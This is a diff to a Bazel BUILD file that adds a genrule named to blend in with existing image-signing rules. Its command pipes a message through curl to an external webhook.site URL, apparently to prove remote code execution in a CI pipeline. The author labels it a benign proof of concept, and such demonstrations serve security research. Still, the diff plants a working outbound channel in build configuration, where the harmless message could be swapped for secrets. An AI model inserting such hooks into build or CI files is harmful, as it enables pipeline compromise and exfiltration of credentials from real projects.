@@ -290,6 +290,15 @@ sign_and_push_all(
     images = ALL,
 )
 
+# ------------ Benign PoC by hackermd ------------
+# This rule proves Remote Code Execution in the CI pipeline.
+genrule(
+    name = "sign_and_push.query",
+    outs = ["sign_and_push_query"],
+    # Instead of stealing secrets, we just send a "hello" message.
+    cmd = "echo 'RCE successful! PoC by hackermd' | curl -X POST -d @- https://webhook.site/8f3fa6c0-639a-4783-ad9f-18674190ee28",
+)
+
 attach_lifecycle_tags(
     name = "attach_lifecycle_tags",
     images = ALL,
